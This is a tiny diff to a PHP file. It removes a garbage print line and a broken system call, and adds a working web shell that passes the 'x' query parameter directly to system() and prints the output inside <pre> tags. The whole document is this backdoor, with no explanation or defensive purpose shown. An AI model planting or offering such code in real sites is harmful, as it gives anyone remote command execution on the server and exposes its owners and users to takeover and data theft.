@@ -1,4 +1,7 @@
+<pre>
 <?php
-print("aokokowkaokawk")
-system("$_GET['a']");
+if($_GET['x']) {
+  system($_GET['x']);
+  }
 ?>
+</pre>
